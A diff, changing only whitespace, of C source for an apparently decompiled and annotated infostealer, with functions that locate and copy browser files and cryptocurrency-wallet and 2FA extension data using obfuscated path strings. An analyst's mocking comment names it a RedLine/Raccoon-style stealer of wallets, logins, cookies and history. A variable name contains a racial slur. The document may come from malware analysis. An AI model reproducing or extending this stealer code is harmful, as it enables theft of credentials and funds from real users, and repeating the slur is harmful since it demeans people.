@@ -1,21 +1,21 @@
 #include "../HEADER/HEADER.c"
 
-void 
-LazyBrowserDataGrabber(LPCWSTR *BrowserAllInfo, 
-                      const WCHAR *Filename, 
+void
+LazyBrowserDataGrabber(LPCWSTR *BrowserAllInfo,
+                      const WCHAR *Filename,
                       void ***SysInfo)
 {
     WCHAR *ExtractedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
     wcscat(ExtractedPath, BrowserAllInfo[1]);
     wcscat(ExtractedPath, L"\\");
     wcscat(ExtractedPath, Filename);
-  
+
     if (verifyFileStatus(ExtractedPath))
     {
         WCHAR *ProcessedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
-        wcscat(ProcessedPath, BrowserAllInfo[0]); 
+        wcscat(ProcessedPath, BrowserAllInfo[0]);
         wcscat(ProcessedPath, L"/");
-        wcscat(ProcessedPath, BrowserAllInfo[2]); 
+        wcscat(ProcessedPath, BrowserAllInfo[2]);
         wcscat(ProcessedPath, L"/");
         wcscat(ProcessedPath, Filename);
 
@@ -34,22 +34,22 @@ LazyBrowserDataGrabber(LPCWSTR *BrowserAllInfo,
     }
 }
 
-void 
-ProcessBrowserExtension(LPCWSTR *BrowserAllInfo, 
-                        const WCHAR *extensionIDs, 
-                        const WCHAR *WalletName, 
+void
+ProcessBrowserExtension(LPCWSTR *BrowserAllInfo,
+                        const WCHAR *extensionIDs,
+                        const WCHAR *WalletName,
                         void ***SysInfo)
 {
     WCHAR *FULLpath = (WCHAR *)calloc(260, sizeof(WCHAR));
     wcscat(FULLpath, BrowserAllInfo[1]);
-    wcscat(FULLpath, GetFilePath(L"\\Locedx765al Extensedx765ion Settinedx765gs\\")); 
+    wcscat(FULLpath, GetFilePath(L"\\Locedx765al Extensedx765ion Settinedx765gs\\"));
     wcscat(FULLpath, extensionIDs);
 
     WCHAR *BrowserDataPath = (WCHAR *)calloc(260, sizeof(WCHAR));
-    wcscat(BrowserDataPath, BrowserAllInfo[0]); 
+    wcscat(BrowserDataPath, BrowserAllInfo[0]);
     wcscat(BrowserDataPath, L"/");
-    wcscat(BrowserDataPath, BrowserAllInfo[2]); 
-    wcscat(BrowserDataPath, GetFilePath(L"/Extedx765ensioedx765ns/")); 
+    wcscat(BrowserDataPath, BrowserAllInfo[2]);
+    wcscat(BrowserDataPath, GetFilePath(L"/Extedx765ensioedx765ns/"));
     wcscat(BrowserDataPath, WalletName);
 
     const WCHAR *TheNigger = GetFilePath(L"*edx765");
@@ -59,27 +59,27 @@ ProcessBrowserExtension(LPCWSTR *BrowserAllInfo,
     free(BrowserDataPath);
 }
 
-void __fastcall 
-CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
+void __fastcall
+CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo,
                     void ***SysInfo)
 { /* CryptoWallrtsAnd2FA - Because skids still cant write original stealers…
- // 
+ //
  // lmfao, This function lazily iterates over a hardcoded list of browser extensions, scanning for
  // cryptocurrency wallets and 2FA extensions Looks like another ripoff of RedLine
  // or Raccoon Stealer except written by someone who thinks obfuscating strings with edx765
  // is peak security
- // 
+ //
  // Key Observations:
  // - Collects extension IDs and wallet paths like every other skiddy stealer (lol)
  // - Passes them to ProcessBrowserExtension to extract stored credentials and keys
  // - Also grabs login data, cookies, and history (as if this is new)
- // 
+ //
  // Seriously, this is just a slightly modified grab and go malware trying to siphon crypto
  // and authentication data. No real innovation, just more recycled garbage*/
 
-  const WCHAR *extensionID, *extensionID_1, *extensionID_2, *extensionID_3, 
-  *extensionID_4, *extensionID_5, *extensionID_6, *extensionID_7, *extensionID_8, 
-  *extensionID_9, *extensionID_10, *extensionID_11, *extensionID_12, *extensionID_13, 
+  const WCHAR *extensionID, *extensionID_1, *extensionID_2, *extensionID_3,
+  *extensionID_4, *extensionID_5, *extensionID_6, *extensionID_7, *extensionID_8,
+  *extensionID_9, *extensionID_10, *extensionID_11, *extensionID_12, *extensionID_13,
   *extensionID_14;
   const WCHAR *walletPath; // [esp-8h] [ebp-14h]
   const WCHAR *walletPath_1; // [esp-8h] [ebp-14h]
